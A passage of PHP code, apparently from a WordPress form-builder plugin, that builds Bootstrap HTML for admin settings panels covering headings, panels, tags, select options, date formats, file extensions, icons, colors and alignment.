																	  <div class="btn-group btn-group-xs  label-size">
																		<button class="btn btn-default small" type="button">Small</button>
																		<button class="btn btn-default  normal" type="button">Normal</button>
																		<button class="btn btn-default  large" type="button">Large</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											
											
											
											$output .= '</div>';

/******************************************************************************************************************************/
//PARAGRAPH SETTINGS												
											$output .= '<div class="row">';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-paragraph">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Text/HTML</label>';
														$output .= '<textarea name="set_paragraph" id="set_paragraph" class="form-control"></textarea>';
													$output .= '</div>';
												$output .= '</div>';
												
											$output .= '</div>';

/******************************************************************************************************************************/
//HEADING SETTINGS												
											$output .= '<div class="row">';
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-heading">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Heading Text</label><br /><small>Add <strong>{math_result}</strong> for math result place holder in the heading.</small>';
														$output .= '<div class="input-group input-group-sm">';
															$output .= '<input name="set_heading" id="set_heading" class="form-control">';
															$output .= '<span class="input-group-addon input-bold"><span class="glyphicon glyphicon-bold"></span></span>';
															$output .= '<span class="input-group-addon input-italic"><span class="glyphicon glyphicon-italic"></span></span>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';

/******************************************************************************************************************************/
//PANEL SETTINGS												
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Heading</label>';
														$output .= '<div class="input-group input-group-sm">';
															$output .= '<input name="set_panel_heading" id="set_panel_heading" class="form-control">';
															$output .= '<span class="input-group-addon panel-head-bold"><span class="glyphicon glyphicon-bold"></span></span>';
															$output .= '<span class="input-group-addon panel-head-italic"><span class="glyphicon glyphicon-italic"></span></span>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Show Panel Heading?</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  show-panel-heading">
																		<button class="btn btn-default yes" type="button">Yes</button>
																		<button class="btn btn-default  no" type="button">No</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Heading Size</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  panel-heading-size">
																		<button class="btn btn-default small" type="button">Small</button>
																		<button class="btn btn-default  normal" type="button">Normal</button>
																		<button class="btn btn-default  large" type="button">Large</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												
												
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Heading Color</label>';
														$output .= '<div id="panel_heading_color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#333333" class="form-control" />
																		<span class="input-group-addon reset" data-default="#333333"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Heading Background Color</label>';
														$output .= '<div id="panel_heading_background" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#F5F5F5" class="form-control" />
																		<span class="input-group-addon reset" data-default="#F5F5F5"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Body Background Color</label>';
														$output .= '<div id="panel_body_background" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#FFFFFF" class="form-control" />
																		<span class="input-group-addon reset" data-default="#FFFFFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Border Color</label>';
														$output .= '<div id="panel_border_color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#DDDDDD" class="form-control" />
																		<span class="input-group-addon reset" data-default="#DDDDDD"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												/*$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-panel" style="z-index:1000">';
													$output .= '<div class="input_holder">';
														$output .= '<label>Font</label>';
														$output .=	'<div class="google-fonts-dropdown-panel input-group input-group-sm"><select name="panel-fonts" class="sfm form-control"></select><span class="input-group-addon"><i><input type="checkbox" checked="checked" title="Show Preview" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-font-preview"></i></span></div>';
													$output .= '</div>'; 
												$output .= '</div>';*/
												
											$output .= '</div>';


                
/******************************************************************************************************************************/
//FIELD INPUT SETTINGS
	/******************************************************************************************************************************/
//TAGS SETTINGS												
											$output .= '<div class="row">';
												//tags
																								
																						
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-tags icons" style="z-index:1000001 !important;">';
													$output .= '<div class="input_holder ">';
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="tag-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_tag_icon set_icon" data-set-class="set_tag_icon" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Tag Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												
														$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-tags icons selected-color" style="z-index:1000000 !important;">';
															$output .= '<div class="input_holder ">';
																$output .= '<div class="btn-group btn-group-xs ">
																			<button type="button"  data-toggle="dropdown" class="btn btn-default tag-color-class colorpicker-element">
																			<i class="btn-default"></i>
																			</button>
																			<div class="btn-group btn-group-xs ">
																			<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
																			Tag Color
																			</button><ul class="dropdown-menu tag-color">
																				  <li><a href="#" class="ui-state-default" style="border:1px solid #ccc"></a></li>	
																				  <li><a href="#" class="label-primary"></a></li>
																				  <li><a href="#" class="label-info"></a></li>
																				  <li><a href="#" class="label-success"></a></li>
																				  <li><a href="#" class="label-warning"></a></li>
																				  <li><a href="#" class="label-danger"></a></li>
																				  <li><a href="#" class="alert-info"></a></li>
																				  <li><a href="#" class="alert-success"></a></li>
																				  <li><a href="#" class="alert-warning"></a></li>
																				  <li><a href="#" class="alert-danger"></a></li>
																				</ul>';
														$output .= '</div></div>';
														$output .= '</div>';
												$output .= '</div>';									
											
											//required / placeholder
											$output .= '<div class="row">';
												//datetime
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-autocomplete">';
													$output .= '<div class="input_holder prepopulate_target">';											
														$output .= '<label>Selection</label>';
														$output .= '<textarea id="set_selections" name="set_selections" class="form-control"></textarea>';
													$output .= '</div>';
												$output .= '</div>';
												//autocomplete
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-date-time">';										
														$output .= '<label>Date Format</label>';
														$output .= '<select id="select_date_format" class="form-control">
																	<option value="DD/MM/YYYY hh:mm A">DD/MM/YYYY hh:mm A</option>
																	<option value="YYYY/MM/DD hh:mm A">YYYY/MM/DD hh:mm A</option>
																	<option value="DD-MM-YYYY hh:mm A">DD-MM-YYYY hh:mm A</option>
																	<option value="YYYY-MM-DD hh:mm A">YYYY-MM-DD hh:mm A</option>
																	<option value="custom">Custom</option>
																</select>';
														$output .= '<br /><input id="set_date_format" type="text" name="set_date_format" value="" class="form-control hidden"><span class="help-block">See <a href="http://momentjs.com/docs/#/displaying/format/" target="_blank">momentjs\' docs</a> for valid formats</span>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-date-time">';										
														$output .= '<label>Select Language</label>';
														$output .= '<select id="date-picker-lang-selector" class="form-control"><option value="en">en</option><option value="ar-ma">ar-ma</option><option value="ar-sa">ar-sa</option><option value="ar-tn">ar-tn</option><option value="ar">ar</option><option value="bg">bg</option><option value="ca">ca</option><option value="cs">cs</option><option value="da">da</option><option value="de-at">de-at</option><option value="de">de</option><option value="el">el</option><option value="en-au">en-au</option><option value="en-ca">en-ca</option><option value="en-gb">en-gb</option><option value="es">es</option><option value="fa">fa</option><option value="fi">fi</option><option value="fr-ca">fr-ca</option><option value="fr">fr</option><option value="he">he</option><option value="hi">hi</option><option value="hr">hr</option><option value="hu">hu</option><option value="id">id</option><option value="is">is</option><option value="it">it</option><option value="ja">ja</option><option value="ko">ko</option><option value="lt">lt</option><option value="lv">lv</option><option value="nb">nb</option><option value="nl">nl</option><option value="pl">pl</option><option value="pt-br">pt-br</option><option value="pt">pt</option><option value="ro">ro</option><option value="ru">ru</option><option value="sk">sk</option><option value="sl">sl</option><option value="sr-cyrl">sr-cyrl</option><option value="sr">sr</option><option value="sv">sv</option><option value="th">th</option><option value="tr">tr</option><option value="uk">uk</option><option value="vi">vi</option><option value="zh-cn">zh-cn</option><option value="zh-tw">zh-tw</option></select>';
														$output .= '';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  populate setting-autocomplete" style="z-index:10000 !important;">';
													$output .= '<div class="input_holder">';											
														$output .= '<label>Presets</label><br />';
														$output .= '<div class="btn-group btn-group-xs ">
																	  <button class="btn btn-primary" type="button"><span class="glyphicon glyphicon-plus"></span>&nbsp;&nbsp;Load Preset</button>
																	  <button data-toggle="dropdown" class="btn btn-primary dropdown-toggle" type="button">
																		<span class="caret"></span>
																		<span class="sr-only">Toggle Dropdown</span>
																	  </button>
																	  <ul role="menu" class="dropdown-menu prepopulate">
																		<li><a href="#" class="countries">Countries</a></li>
																		<li><a href="#" class="us-states">US States</a></li>
																		<li><a href="#" class="languages">Languages</a></li>
																	  </ul>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												//color-pallet
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-color-pallet">';
													$output .= '<div class="input_holder prepopulate_target">';											
														$output .= '<label>Color Selection</label>';
														$output .= '<textarea id="set_color_selection" name="set_color_selection" class="form-control"></textarea>';
													$output .= '</div>';
												$output .= '</div>';
												
											
												//select
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-select setting-multi-select">';
													$output .= '<div class="input_holder prepopulate_target">';	
														$output .= '<label>Default Value</label>';
														$output .= '<input id="set_default_value" type="text" name="set_default_value" value="--- Select ---" class="form-control">';										
														
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-select setting-multi-select">';
													$output .= '<div class="input_holder prepopulate_target">';											
														$output .= '<label>Select Options</label>';
														$output .= '<textarea id="set_options" name="set_options" class="form-control"></textarea>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  populate setting-select setting-multi-select"  style="z-index:10000 !important;">';
													$output .= '<div class="input_holder">';											
														$output .= '<label>Presets</label><br />';
														$output .= '<div class="btn-group btn-group-xs ">
																	  <button class="btn btn-primary" type="button"><span class="glyphicon glyphicon-plus"></span>&nbsp;&nbsp;Load Preset</button>
																	  <button data-toggle="dropdown" class="btn btn-primary dropdown-toggle" type="button">
																		<span class="caret"></span>
																		<span class="sr-only">Toggle Dropdown</span>
																	  </button>
																	  <ul role="menu" class="dropdown-menu prepopulate">
																		<li><a href="#" class="countries">Counties</a></li>
																		<li><a href="#" class="us-states">US States</a></li>
																		<li><a href="#" class="languages">Languages</a></li>
																	  </ul>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												//file input
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-validation-file-input" >';
													$output .= '<div class="input_holder prepopulate_target">';
													$output .= '<label>Allowed Extensions</label>';
														$output .= '<textarea id="set_extensions" name="set_extensions" class="form-control"></textarea>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  populate setting-validation-file-input" style="z-index:1000000 !important;">';
													$output .= '<div class="input_holder">';											
														$output .= '<label>Presets</label>';
														$output .= '<div class="btn-group btn-group-xs ">
																	  <button class="btn btn-primary" type="button"><span class="glyphicon glyphicon-plus"></span>&nbsp;&nbsp;Load Extensions</button>
																	  <button data-toggle="dropdown" class="btn btn-primary dropdown-toggle" type="button">
																		<span class="caret"></span>
																		<span class="sr-only">Toggle Dropdown</span>
																	  </button>
																	  <ul role="menu" class="dropdown-menu prepopulate">
																		<li><a href="#" class="all_extensions">All</a></li>
																		<li><a href="#" class="image_extensions">Image</a></li>
																		<li><a href="#" class="file_extensions">File</a></li>
																	  </ul>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-text setting-textarea">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Place Holder</label>';
														$output .= '<input id="set_place_holder" type="text" name="set_place_holder" class="form-control">';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
											$output .= '</div>';
											
											//Input value / max chars
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-text setting-textarea setting-button">';
													
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Input Value</label>';
														$output .= '<div class="input-group input-group-sm">';
															$output .= '<input id="set_val" type="text" name="set_val" class="form-control">';
														    $output .= '<span class="input-group-addon input-bold"><span class="glyphicon glyphicon-bold"></span></span>';
															$output .= '<span class="input-group-addon input-italic"><span class="glyphicon glyphicon-italic"></span></span>';

														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';	
											
											
											
											
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-button">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  button-width">
																		<button class="btn btn-default normal" type="button"><span class="glyphicon glyphicon-font"></span>&nbsp;&nbsp;Normal</button>
																		<button class="btn btn-default full_button" type="button"><span class="glyphicon glyphicon-font"></span>&nbsp;&nbsp;Full</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
											
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-button icons selected-color" style="z-index:1000004 !important;">';
														$output .= '<div class="input_holder ">';											
															$output .= '';
															$output .= '<div class="btn-group btn-group-xs ">
																		<button type="button"  data-toggle="dropdown" class="btn btn-default prefix-color-class colorpicker-element">
																		<i class="btn-default"></i>
																		</button>
																		<div class="btn-group btn-group-xs ">
																		<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
																		Button Color
																		</button><ul class="dropdown-menu button-color">
																			  <li><a href="#" class="btn-default" style="border:1px solid #ccc"></a></li>	
																			  <li><a href="#" class="btn-primary"></a></li>
																			  <li><a href="#" class="btn-info"></a></li>
																			  <li><a href="#" class="btn-success"></a></li>
																			  <li><a href="#" class="btn-warning"></a></li>
																			  <li><a href="#" class="btn-danger"></a></li>
																			  <li><a href="#" class="alert-info"></a></li>
																			  <li><a href="#" class="alert-success"></a></li>
																			  <li><a href="#" class="alert-warning"></a></li>
																			  <li><a href="#" class="alert-danger"></a></li>
																			</ul>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
										$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden setting-prefix setting-button setting-postfix" style="clear:both;"></div>';		
										$output .= '<div class="row">';	
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden setting-prefix icons" style="z-index:1000005 !important;">';
													$output .= '<div class="input_holder ">';		
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="prefix-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_prefix_icon set_icon" data-set-class="set_prefix" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Prefix Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
													$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-prefix icons selected-color" style="z-index:1000004 !important;">';
														$output .= '<div class="input_holder ">';											
															$output .= '';
															$output .= '<div class="btn-group btn-group-xs ">
																		<button type="button"  data-toggle="dropdown" class="btn btn-default prefix-color-class colorpicker-element">
																		<i class="btn-default"></i>
																		</button>
																		<div class="btn-group btn-group-xs ">
																		<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
																		Prefix Color
																		</button><ul class="dropdown-menu prefix-color">
																			  <li><a href="#" class="nf-default" style="border:1px solid #ddd"></a></li>
																			  <li><a href="#" class="ui-state-default" style="border:1px solid #ddd; background:#eee;"></a></li>																			  	
																			  <li><a href="#" class="label-primary"></a></li>
																			  <li><a href="#" class="label-info"></a></li>
																			  <li><a href="#" class="label-success"></a></li>
																			  <li><a href="#" class="label-warning"></a></li>
																			  <li><a href="#" class="label-danger"></a></li>
																			  <li><a href="#" class="alert-info"></a></li>
																			  <li><a href="#" class="alert-success"></a></li>
																			  <li><a href="#" class="alert-warning"></a></li>
																			  <li><a href="#" class="alert-danger"></a></li>
																			</ul>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';	
											$output .= '</div>';
										$output .= '</div>';

/******************************************************************************************************************************/
//POSTFIX             							 
											//text
											$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden settings-validation  settings-all" style="clear:both;"></div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-postfix icons" style="z-index:1000005 !important;">';
													$output .= '<div class="input_holder ">';											
														$output .= '
';
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="postfix-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_postfix_icon set_icon" data-set-class="set_postfix" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Postfix Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
													$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-postfix icons selected-color" style="z-index:1000002 !important;">';
														$output .= '<div class="input_holder ">';											
															$output .= '
';
															$output .= '<div class="btn-group btn-group-xs ">
																		<button type="button" data-toggle="dropdown" class="btn btn-default postfix-color-class colorpicker-element">
																		<i class="btn-default"></i>
																		</button>
																		<div class="btn-group btn-group-xs ">
																		<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
																		Postfix Color
																		</button><ul class="dropdown-menu postfix-color">
																			  <li><a href="#" class="nf-default" style="border:1px solid #ddd"></a></li>
																			  <li><a href="#" class="ui-state-default" style="border:1px solid #ddd; background:#eee;"></a></li>																			  	
																			  <li><a href="#" class="label-primary"></a></li>
																			  <li><a href="#" class="label-info"></a></li>
																			  <li><a href="#" class="label-success"></a></li>
																			  <li><a href="#" class="label-warning"></a></li>
																			  <li><a href="#" class="label-danger"></a></li>
																			  <li><a href="#" class="alert-info"></a></li>
																			  <li><a href="#" class="alert-success"></a></li>
																			  <li><a href="#" class="alert-warning"></a></li>
																			  <li><a href="#" class="alert-danger"></a></li>
																			</ul>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';		
											
											//Colors
											$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  settings-all" style="clear:both;"></div>';
											
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-paragraph setting-heading settings-input setting-md-input setting-button">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Color</label>';
														$output .= '<div id="input-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#000000" class="form-control" />
																		<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input setting-button">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Color</label>';
														$output .= '<div id="input-bg-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#FFFFFF" class="form-control" />
																		<span class="input-group-addon reset" data-default="#FFFFFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
											//Border
											$output .= '<div class="row ">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input setting-button setting-divider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Border Color</label>';
														$output .= '<div id="input-border-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#DDDDDD" class="form-control" />
																		<span class="input-group-addon reset" data-default="#DDDDDD"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												/*$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Border Color On Focus</label>';
														$output .= '<div id="input-onfocus-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#66AFE9" class="form-control" />
																		<span class="input-group-addon" ><i><input type="checkbox" checked="checked" name="drop-focus-swadow" class="bs-tooltip" data-toggle="tooltip" data-placement="top" title="Drop shadow?"></i></span>
																		<span class="input-group-addon reset" data-default="#66AFE9"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';*/
											$output .= '</div>';
											
											
											//Size / Alignment
											$output .= '<div class="row">';
												//paragraph
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-paragraph">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Text Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  align-input">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;</button>
																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;</button>																		
																		<button class="btn btn-default justify" type="button"><span class="glyphicon glyphicon-align-justify"></span>&nbsp;</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input setting-md-input setting-heading setting-button">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  align-input">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;&nbsp;Left</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;&nbsp;Right</button>
																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;&nbsp;Center</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-paragraph">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Text Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  align-input">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;</button>
																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;</button>																		
																		<button class="btn btn-default justify" type="button"><span class="glyphicon glyphicon-align-justify"></span>&nbsp;</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												/*output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input setting-button">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Field Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  input-field-alignment">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;</button>
																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;</button>	
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';*/
											$output .= '</div>';
											//font
											/*$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input setting-paragraph setting-heading setting-button" style="z-index:1000">';
													$output .= '<div class="input_holder">';
														$output .= '<label>Font</label>';
														$output .=	'<div class="google-fonts-dropdown-input input-group input-group-sm"><select name="input-fonts" class="sfm form-control"></select><span class="input-group-addon"><i><input type="checkbox" checked="checked" title="Show Preview" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-font-preview"></i></span></div>';
													$output .= '</div>'; 
												$output .= '</div>';
											
											$output .= '</div>';*/

/******************************************************************************************************************************/
//HELP TEXT SETTINGS
										
											//Text
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-help-text">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Text</label>';														
														$output .= '<div class="input-group input-group-sm">';
															$output .= '<input id="set_help_text" type="text" name="set_help_text" class="form-control">';
														    $output .= '<span class="input-group-addon help-text-bold"><span class="glyphicon glyphicon-bold"></span></span>';
															$output .= '<span class="input-group-addon help-text-italic"><span class="glyphicon glyphicon-italic"></span></span>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-help-text">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Color</label>';
														$output .= '<div id="help-text-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#737373" class="form-control" />
																		<span class="input-group-addon reset" data-default="#737373"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
											//Position / alignment
											$output .= '<div class="row">';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-help-text">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Position</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  show-help-text">
																		<button class="btn btn-default btn-primary bottom" type="button"><span class="glyphicon glyphicon-arrow-down"></span>&nbsp;&nbsp;Bottom</button>
																		<button class="btn btn-default show-tooltip" type="button"><span class="glyphicon fa fa-question-circle"></span>&nbsp;&nbsp;Tip</button>
																		<button class="btn btn-default none" type="button"><span class=" glyphicon glyphicon-eye-close"></span>&nbsp;&nbsp;Hide</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-help-text">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Text Alignment</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  align-help-text">
																		<button class="btn btn-default left" type="button"><span class="glyphicon glyphicon-align-left"></span>&nbsp;&nbsp;Left</button>
